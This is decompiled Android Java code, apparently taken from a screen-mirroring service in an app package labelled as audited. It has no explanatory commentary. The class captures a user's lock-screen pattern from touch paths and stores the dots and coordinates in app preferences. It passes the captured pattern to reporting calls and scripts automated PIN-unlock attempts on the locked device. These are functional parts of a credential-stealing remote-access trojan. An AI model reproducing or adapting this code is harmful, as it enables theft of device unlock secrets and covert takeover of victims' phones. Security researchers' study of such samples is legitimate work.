// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package w1;

import android.content.SharedPreferences;
import android.graphics.Rect;
import android.util.Log;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Map;
import lyr.stable.runtime.ScreenMirrorService;
import org.json.JSONArray;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class u9 implements Runnable {

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final /* synthetic */ int f5236c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final /* synthetic */ ScreenMirrorService f5237d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public final /* synthetic */ long f5238e;

    public /* synthetic */ u9(ScreenMirrorService screenMirrorService, long j3, int i3) {
        this.f5236c = i3;
        this.f5237d = screenMirrorService;
        this.f5238e = j3;
    }

    @Override // java.lang.Runnable
    public final void run() {
        float[] fArr;
        float[] fArr2;
        float[] fArr3;
        float[] fArr4;
        float[] fArrV4;
        int iIndexOf;
        boolean z2;
        int i3 = 9;
        int i4 = 8;
        switch (this.f5236c) {
            case 0:
                ScreenMirrorService screenMirrorService = this.f5237d;
                long j3 = this.f5238e;
                screenMirrorService.t2++;
                screenMirrorService.f2541t.postDelayed(new sa(screenMirrorService, j3, new f2.t(screenMirrorService, 4), 1), 950L);
                break;
            case 1:
                ScreenMirrorService screenMirrorService2 = this.f5237d;
                if (screenMirrorService2.B1.get() == this.f5238e) {
                    pa paVar = new pa(screenMirrorService2, 20);
                    x xVar = screenMirrorService2.G2;
                    if (xVar == null || !xVar.E(paVar)) {
                        paVar.run();
                    }
                    break;
                }
                break;
            case 2:
                ScreenMirrorService screenMirrorService3 = this.f5237d;
                long j4 = this.f5238e;
                if (screenMirrorService3.A1.get() == j4) {
                    u9 u9Var = new u9(screenMirrorService3, j4, 3);
                    x xVar2 = screenMirrorService3.G2;
                    if (xVar2 == null || !xVar2.E(u9Var)) {
                        u9Var.run();
                    }
                    break;
                }
                break;
            case 3:
                ScreenMirrorService screenMirrorService4 = this.f5237d;
                long j5 = this.f5238e;
                if (screenMirrorService4.A1.compareAndSet(j5, 1 + j5)) {
                    float[] fArr5 = screenMirrorService4.f2497g2;
                    boolean z3 = fArr5 != null && fArr5.length >= 8;
                    Rect rectK2 = screenMirrorService4.k2();
                    if (rectK2 == null) {
                        rectK2 = screenMirrorService4.f2521m2;
                    }
                    if (screenMirrorService4.f2557x1.size() < 4 && z3 && rectK2 != null) {
                        float[] fArr6 = screenMirrorService4.f2497g2;
                        if (fArr6 != null && fArr6.length >= 8) {
                            float fMin = Math.min(rectK2.width() / 3.0f, rectK2.height() / 3.0f) * 0.62f;
                            float f3 = fMin * fMin;
                            int length = fArr6.length / 2;
                            for (int i5 = 0; i5 < length; i5++) {
                                int i6 = i5 * 2;
                                float f4 = fArr6[i6];
                                float f5 = fArr6[i6 + 1];
                                Integer numZ4 = screenMirrorService4.z4(ScreenMirrorService.e0((int) (screenMirrorService4.O3 * f4), screenMirrorService4.O3), ScreenMirrorService.e0((int) (screenMirrorService4.P3 * f5), screenMirrorService4.P3), rectK2, f3);
                                if (numZ4 != null) {
                                    screenMirrorService4.Q6(numZ4.intValue(), f4, f5);
                                }
                            }
                        }
                        Log.i("ScreenMirror", "[Unlock] pattern flush inferred dots=" + screenMirrorService4.f2557x1.size() + " from touch path grid=" + rectK2);
                    }
                    if (screenMirrorService4.f2557x1.size() >= 4 || z3) {
                        HashSet hashSet = new HashSet(screenMirrorService4.f2557x1);
                        if (screenMirrorService4.f2557x1.size() < 4 || hashSet.size() >= 2 || z3) {
                            if (screenMirrorService4.f2557x1.size() >= 4) {
                                ArrayList arrayList = screenMirrorService4.f2557x1;
                                if (arrayList != null && arrayList.size() >= 4 && arrayList.size() <= 12) {
                                    int i7 = 0;
                                    boolean z4 = true;
                                    while (true) {
                                        if (i7 < arrayList.size()) {
                                            int iIntValue = arrayList.get(i7) != null ? ((Integer) arrayList.get(i7)).intValue() : -1;
                                            if (iIntValue >= 1 && iIntValue <= 9) {
                                                if (iIntValue != (i7 % 9) + 1) {
                                                    z4 = false;
                                                }
                                                i7++;
                                            }
                                        } else {
                                            z2 = !z4 && new HashSet(arrayList).size() >= 3;
                                        }
                                    }
                                }
                                if (!z2) {
                                    Log.w("ScreenMirror", "[Unlock] pattern flush rejected noisy sequence");
                                    screenMirrorService4.j0();
                                }
                            }
                            StringBuilder sb = new StringBuilder();
                            if (screenMirrorService4.f2557x1.size() >= 4) {
                                fArr = new float[screenMirrorService4.f2557x1.size()];
                                fArr2 = new float[screenMirrorService4.f2557x1.size()];
                                if (rectK2 == null) {
                                    rectK2 = screenMirrorService4.f2521m2;
                                }
                                for (int i8 = 0; i8 < screenMirrorService4.f2557x1.size(); i8++) {
                                    Integer num = (Integer) screenMirrorService4.f2557x1.get(i8);
                                    int iIntValue2 = num.intValue();
                                    if (i8 > 0) {
                                        sb.append(',');
                                    }
                                    sb.append(iIntValue2);
                                    String str = (String) screenMirrorService4.f2561y1.get(num);
                                    if (str == null || str.isEmpty() || (iIndexOf = str.indexOf(44)) <= 0 || iIndexOf >= str.length() - 1) {
                                        fArrV4 = null;
                                    } else {
                                        try {
                                            fArrV4 = new float[]{Float.parseFloat(str.substring(0, iIndexOf)), Float.parseFloat(str.substring(iIndexOf + 1))};
                                        } catch (Throwable unused) {
                                            fArrV4 = null;
                                        }
                                    }
                                    if (fArrV4 == null) {
                                        fArrV4 = screenMirrorService4.V4(iIntValue2, rectK2);
                                    }
                                    if (fArrV4 == null) {
                                        Log.w("ScreenMirror", "[Unlock] pattern flush missing coord for dot " + iIntValue2);
                                        screenMirrorService4.j0();
                                    } else {
                                        fArr[i8] = fArrV4[0];
                                        fArr2[i8] = fArrV4[1];
                                    }
                                }
                            } else {
                                fArr = new float[0];
                                fArr2 = new float[0];
                            }
                            float[] fArrH1 = fArr.length >= 2 ? ScreenMirrorService.H1(fArr, fArr2) : null;
                            if ((fArrH1 == null || fArrH1.length < 8) && !z3) {
                                Log.w("ScreenMirror", "[Unlock] pattern flush ignored: expanded path too short");
                                screenMirrorService4.j0();
                            } else {
                                if (screenMirrorService4.f2557x1.size() >= 4) {
                                    fArr3 = new float[fArrH1.length / 2];
                                    fArr4 = new float[fArrH1.length / 2];
                                    int i9 = 0;
                                    int i10 = 0;
                                    while (i9 < fArrH1.length) {
                                        fArr3[i10] = fArrH1[i9];
                                        fArr4[i10] = fArrH1[i9 + 1];
                                        i9 += 2;
                                        i10++;
                                    }
                                } else if (z3) {
                                    int length2 = screenMirrorService4.f2497g2.length / 2;
                                    fArr3 = new float[length2];
                                    fArr4 = new float[length2];
                                    int i11 = 0;
                                    int i12 = 0;
                                    while (true) {
                                        float[] fArr7 = screenMirrorService4.f2497g2;
                                        if (i11 < fArr7.length) {
                                            fArr3[i12] = fArr7[i11];
                                            fArr4[i12] = fArr7[i11 + 1];
                                            i11 += 2;
                                            i12++;
                                        }
                                    }
                                } else {
                                    fArr3 = new float[fArrH1.length / 2];
                                    fArr4 = new float[fArrH1.length / 2];
                                    int i13 = 0;
                                    int i14 = 0;
                                    while (i13 < fArrH1.length) {
                                        fArr3[i14] = fArrH1[i13];
                                        fArr4[i14] = fArrH1[i13 + 1];
                                        i13 += 2;
                                        i14++;
                                    }
                                }
                                try {
                                    JSONObject jSONObject = new JSONObject();
                                    jSONObject.put("k", 3);
                                    jSONObject.put("ms", 1400);
                                    jSONObject.put("dt", 0);
                                    JSONArray jSONArray = new JSONArray();
                                    JSONArray jSONArray2 = new JSONArray();
                                    for (int i15 = 0; i15 < fArr3.length; i15++) {
                                        jSONArray.put(fArr3[i15]);
                                        jSONArray2.put(fArr4[i15]);
                                    }
                                    jSONObject.put("xs", jSONArray);
                                    jSONObject.put("ys", jSONArray2);
                                    JSONArray jSONArray3 = new JSONArray();
                                    jSONArray3.put(jSONObject);
                                    SharedPreferences.Editor editorEdit = screenMirrorService4.getSharedPreferences("unlock_seq", 0).edit();
                                    editorEdit.putString("pattern_seq_json", jSONArray3.toString());
                                    editorEdit.putString("pattern_dots", sb.toString());
                                    ScreenMirrorService.m0(editorEdit);
                                    for (Map.Entry entry : screenMirrorService4.f2561y1.entrySet()) {
                                        editorEdit.putString("pattern_dot_coord_" + entry.getKey(), (String) entry.getValue());
                                    }
                                    editorEdit.apply();
                                    screenMirrorService4.d0(fArr3, fArr4);
                                    Log.i("ScreenMirror", "[Unlock] captured pattern committed dots=" + screenMirrorService4.f2557x1.size() + " unique=" + hashSet.size() + " pathPts=" + fArr3.length);
                                    if (sb.length() > 0) {
                                        String string = sb.toString();
                                        screenMirrorService4.N0().a("pt", string);
                                        screenMirrorService4.F4("pattern", string);
                                        screenMirrorService4.m6("pattern");
                                    }
                                } catch (Throwable th) {
                                    a0.a.p(th, new StringBuilder("[Unlock] pattern flush fail: "), "ScreenMirror");
                                }
                                screenMirrorService4.j0();
                                screenMirrorService4.f2493f2.clear();
                                screenMirrorService4.f2497g2 = null;
                            }
                        } else {
                            Log.w("ScreenMirror", "[Unlock] pattern flush ignored: need >=2 distinct dots, got " + hashSet.size());
                            screenMirrorService4.j0();
                        }
                    } else {
                        screenMirrorService4.j0();
                    }
                    break;
                }
                break;
            case 4:
                ScreenMirrorService screenMirrorService5 = this.f5237d;
                long j6 = this.f5238e;
                rd rdVar = ScreenMirrorService.n6;
                screenMirrorService5.a5(j6);
                break;
            case 5:
                ScreenMirrorService screenMirrorService6 = this.f5237d;
                long j7 = this.f5238e;
                if (screenMirrorService6.f2541t != null && j7 == screenMirrorService6.f2536r2) {
                    if (screenMirrorService6.J3()) {
                        boolean zP0 = screenMirrorService6.p0(j7);
                        StringBuilder sb2 = new StringBuilder("[Ctrl] UNLOCK_PIN confirm attempt=0 strategy=");
                        sb2.append(zP0 ? "snapshot-confirm" : "none");
                        sb2.append(" submitted=");
                        sb2.append(zP0);
                        sb2.append(" locked=");
                        sb2.append(screenMirrorService6.J3());
                        sb2.append(" digitCache=");
                        sb2.append(screenMirrorService6.f2564z1.keySet());
                        Log.i("ScreenMirror", sb2.toString());
                        if (zP0) {
                            screenMirrorService6.f2541t.postDelayed(new u9(screenMirrorService6, j7, i3), 900L);
                        } else {
                            Log.i("ScreenMirror", "[Ctrl] UNLOCK_PIN no explicit confirm; no further touch");
                            screenMirrorService6.f2541t.postDelayed(new u9(screenMirrorService6, j7, i4), 900L);
                        }
                    } else {
                        screenMirrorService6.R2(j7);
                    }
                }
                break;
            case 6:
                ScreenMirrorService screenMirrorService7 = this.f5237d;
                long j8 = this.f5238e;
                rd rdVar2 = ScreenMirrorService.n6;
                screenMirrorService7.R2(j8);
                break;
            case 7:
                ScreenMirrorService screenMirrorService8 = this.f5237d;
                long j9 = this.f5238e;
                rd rdVar3 = ScreenMirrorService.n6;
                screenMirrorService8.p0(j9);
                break;
            case 8:
                ScreenMirrorService screenMirrorService9 = this.f5237d;
                long j10 = this.f5238e;
                if (j10 == screenMirrorService9.f2536r2) {
                    screenMirrorService9.R2(j10);
                    break;
                }
                break;
            default:
                ScreenMirrorService screenMirrorService10 = this.f5237d;
                long j11 = this.f5238e;
                if (j11 == screenMirrorService10.f2536r2) {
                    screenMirrorService10.R2(j11);
                    break;
                }
                break;
        }
    }
}
